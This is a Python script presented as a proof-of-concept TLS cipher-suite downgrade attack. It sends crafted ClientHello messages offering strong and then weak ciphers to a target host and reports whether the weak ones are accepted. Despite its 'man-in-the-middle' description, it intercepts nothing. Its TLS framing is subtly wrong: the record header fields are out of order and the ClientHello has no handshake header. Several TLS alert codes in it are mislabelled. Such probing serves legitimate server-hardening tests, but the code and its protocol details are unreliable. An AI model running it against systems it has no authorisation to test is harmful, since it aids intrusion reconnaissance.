#!/usr/bin/env python3
"""
Proof-of-Concept: TLS Cipher Suite Downgrade Attack

This script demonstrates a man-in-the-middle (MitM) style downgrade attack.
It simulates an attacker intercepting a ClientHello, stripping strong cipher suites,
and forwarding a weakened ClientHello to the server. If the server is misconfigured
to support weak ciphers, it may accept the connection, violating RFC 8446 security
restrictions.

Note: This script requires root privileges on most systems to bind to low ports or
use raw sockets for packet manipulation. It is intended for educational purposes
on authorized systems only.
"""

import struct
import socket
import sys
import random
import hashlib
import hmac
import time

# --- TLS Constants ---
TLS_VERSION_1_2 = (0x03, 0x03)
TLS_VERSION_1_0 = (0x03, 0x01)

# Cipher Suite IDs (RFC 5246 / RFC 8446)
# Strong ciphers
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 = (0xC0, 0x2F)
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 = (0xC0, 0x30)
TLS_DHE_RSA_WITH_AES_128_CBC_SHA = (0x00, 0x33)

# Weak ciphers (Vulnerable targets)
TLS_RSA_WITH_RC4_128_SHA = (0x00, 0x05)
TLS_RSA_WITH_DES_CBC_SHA = (0x00, 0x09)
TLS_RSA_WITH_3DES_EDE_CBC_SHA = (0x00, 0x0A)

# Extensions
EXTENSION_SERVER_NAME = 0x0000
EXTENSION_SUPPORTED_GROUPS = 0x000A
EXTENSION_SIGNATURE_ALGORITHMS = 0x000D

# --- Helper Functions ---

def pack_uint16(val):
    return struct.pack('!H', val)

def pack_uint24(val):
    return struct.pack('!I', val)[1:]

def build_client_hello(cipher_suites, extensions=None):
    """
    Constructs a TLS ClientHello message.
    
    Args:
        cipher_suites: List of tuples (byte1, byte2) representing cipher suite IDs.
        extensions: Optional list of extension bytes.
    
    Returns:
        Bytes of the ClientHello message.
    """
    if extensions is None:
        extensions = b''
    
    # Random bytes for Client Random
    client_random = bytes([random.randint(0, 255) for _ in range(32)])
    
    # Session ID (empty for simplicity)
    session_id_length = 0
    session_id = b''
    
    # Cipher Suites
    cipher_suite_bytes = b''
    for cs in cipher_suites:
        cipher_suite_bytes += struct.pack('!BB', cs[0], cs[1])
    cipher_suites_length = len(cipher_suite_bytes)
    
    # Compression Methods (null)
    compression_methods = b'\x00'
    compression_methods_length = 1
    
    # Extensions Length
    extensions_length = len(extensions)
    
    # Calculate Total Length
    # Version(2) + Random(32) + Session ID Len(1) + Session ID(var) + 
    # Cipher Suites Len(2) + Cipher Suites(var) + Compression Len(1) + 
    # Compression(var) + Extensions Len(2) + Extensions(var)
    hello_length = 2 + 32 + 1 + session_id_length + 2 + cipher_suites_length + 1 + compression_methods_length + 2 + extensions_length
    
    # Construct Message
    msg = b''
    msg += struct.pack('!BB', TLS_VERSION_1_2[0], TLS_VERSION_1_2[1]) # Legacy Version
    msg += client_random
    msg += struct.pack('!B', session_id_length)
    msg += session_id
    msg += struct.pack('!H', cipher_suites_length)
    msg += cipher_suite_bytes
    msg += struct.pack('!B', compression_methods_length)
    msg += compression_methods
    msg += struct.pack('!H', extensions_length)
    msg += extensions
    
    return msg

def build_tls_record(content, content_type=0x01, version=TLS_VERSION_1_2):
    """
    Wraps a TLS message in a TLS Record Layer header.
    
    Args:
        content: The TLS message bytes (e.g., ClientHello).
        content_type: TLS record content type (0x01 = Handshake).
        version: TLS version tuple.
    
    Returns:
        Complete TLS record bytes.
    """
    record = b''
    record += struct.pack('!BB', version[0], version[1])
    record += struct.pack('!B', content_type)
    record += struct.pack('!H', len(content))
    record += content
    return record

def send_and_receive(target_ip, target_port, client_hello_bytes, timeout=5):
    """
    Sends a TLS ClientHello to the target and receives the response.
    
    Args:
        target_ip: Target server IP address.
        target_port: Target server port.
        client_hello_bytes: The crafted ClientHello message.
        timeout: Socket timeout in seconds.
    
    Returns:
        Tuple of (response_bytes, error_message).
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))
        
        # Send the crafted ClientHello
        sock.sendall(client_hello_bytes)
        
        # Receive ServerHello or Alert
        response = sock.recv(4096)
        sock.close()
        return response, None
        
    except socket.timeout:
        return None, "Connection timed out."
    except socket.error as e:
        return None, f"Socket error: {e}"
    except Exception as e:
        return None, f"Unexpected error: {e}"

def parse_tls_alert(alert_bytes):
    """
    Parses a TLS Alert message.
    
    Args:
        alert_bytes: Bytes of the TLS alert.
    
    Returns:
        Tuple of (level, description).
    """
    if len(alert_bytes) < 2:
        return "Unknown", "Invalid alert length"
    
    level = alert_bytes[0]
    description = alert_bytes[1]
    
    level_str = "Warning" if level == 1 else "Fatal" if level == 2 else "Unknown"
    
    # Common alert descriptions
    alerts = {
        10: "Close Notify",
        40: "Handshake Failure",
        42: "Bad Certificate",
        43: "Unsupported Certificate",
        44: "Certificate Revoked",
        45: "Certificate Expired",
        46: "Certificate Unknown",
        47: "Illegal Parameter",
        48: "Decode Error",
        50: "Insufficient Security",
        70: "User Canceled",
        80: "No Renegotiation",
        100: "Unsupported Extension",
        110: "Certificate Unobtainable",
        111: "Unrecognized Name",
        112: "Bad Certificate Status Response",
        113: "Bad Certificate Hash Algorithm",
        114: "Unknown PSK Identity",
        115: "Encrypted Extensions",
        116: "Decrypt Error",
        117: "Record Overflow"
    }
    
    desc_str = alerts.get(description, f"Unknown ({description})")
    return level_str, desc_str

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        print("Example: python3 poc_cipher_suite_downgrade.py 192.168.1.100 443")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print(f"[*] Target: {target_ip}:{target_port}")
    print("[*] Demonstrating TLS Cipher Suite Downgrade Attack")
    print("-" * 50)
    
    # --- Step 1: Craft a normal ClientHello with strong ciphers ---
    print("\n[1] Crafting normal ClientHello with strong cipher suites...")
    strong_ciphers = [
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    ]
    normal_hello = build_client_hello(strong_ciphers)
    normal_record = build_tls_record(normal_hello)
    
    # --- Step 2: Craft a downgraded ClientHello with only weak ciphers ---
    print("[2] Crafting downgraded ClientHello with weak cipher suites...")
    weak_ciphers = [
        TLS_RSA_WITH_RC4_128_SHA,
        TLS_RSA_WITH_DES_CBC_SHA,
        TLS_RSA_WITH_3DES_EDE_CBC_SHA
    ]
    weak_hello = build_client_hello(weak_ciphers)
    weak_record = build_tls_record(weak_hello)
    
    # --- Step 3: Send normal ClientHello (Baseline) ---
    print("\n[3] Sending normal ClientHello to target...")
    normal_response, error = send_and_receive(target_ip, target_port, normal_record)
    if error:
        print(f"[!] Error sending normal ClientHello: {error}")
    else:
        print(f"[+] Normal ClientHello sent. Response length: {len(normal_response)} bytes")
        if normal_response[0] == 0x15: # Alert
            level, desc = parse_tls_alert(normal_response[5:7])
            print(f"    Alert: {level} - {desc}")
        elif normal_response[0] == 0x16: # Handshake
            print("    Handshake response received (ServerHello).")
        else:
            print(f"    Unexpected record type: 0x{normal_response[0]:02x}")
    
    # --- Step 4: Send downgraded ClientHello (Attack) ---
    print("\n[4] Sending downgraded ClientHello to target...")
    weak_response, error = send_and_receive(target_ip, target_port, weak_record)
    if error:
        print(f"[!] Error sending downgraded ClientHello: {error}")
    else:
        print(f"[+] Downgraded ClientHello sent. Response length: {len(weak_response)} bytes")
        if weak_response[0] == 0x15: # Alert
            level, desc = parse_tls_alert(weak_response[5:7])
            print(f"    Alert: {level} - {desc}")
            if desc == "Insufficient Security":
                print("    [✓] Server correctly rejected weak ciphers (RFC 8446 compliant).")
            elif desc == "Handshake Failure":
                print("    [✓] Server rejected handshake (likely no common ciphers).")
            else:
                print("    [?] Server sent an unexpected alert.")
        elif weak_response[0] == 0x16: # Handshake
            print("    [!] Server accepted the downgraded ClientHello!")
            print("    [!] VULNERABILITY CONFIRMED: Server negotiated weak cipher suite.")
            # Parse ServerHello to see selected cipher
            if len(weak_response) > 10:
                selected_cipher = weak_response[9:11]
                print(f"    Selected Cipher Suite: 0x{selected_cipher.hex().upper()}")
        else:
            print(f"    Unexpected record type: 0x{weak_response[0]:02x}")
    
    print("\n[*] Attack demonstration complete.")

if __name__ == "__main__":
    main()
